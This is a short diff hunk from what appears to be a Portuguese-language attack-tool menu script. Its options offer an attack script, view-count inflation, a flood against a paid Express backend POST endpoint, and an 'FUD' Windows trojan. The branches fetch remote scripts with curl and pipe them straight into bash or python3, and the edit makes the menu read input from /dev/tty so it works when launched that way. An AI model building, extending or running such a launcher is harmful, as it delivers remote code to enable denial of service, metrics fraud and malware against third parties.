@@ -11,7 +11,7 @@ echo " [2] CONTADOR INFLACAO (visualizacoes)"
 echo " [3] FLOOD BACKEND EXPRESS (POST pago)"
 echo " [4] TROJAN FUD (windows)"
 echo " [0] SAIR"
-echo -n "digite o numero: "; read OP
+echo -n "digite o numero: "; read OP < /dev/tty
 case "$OP" in
   1) curl -skL $RAW/woiz_strike.sh | bash ;;
   2) curl -skL $RAW/views_inflate.py | python3 - 20 ;;
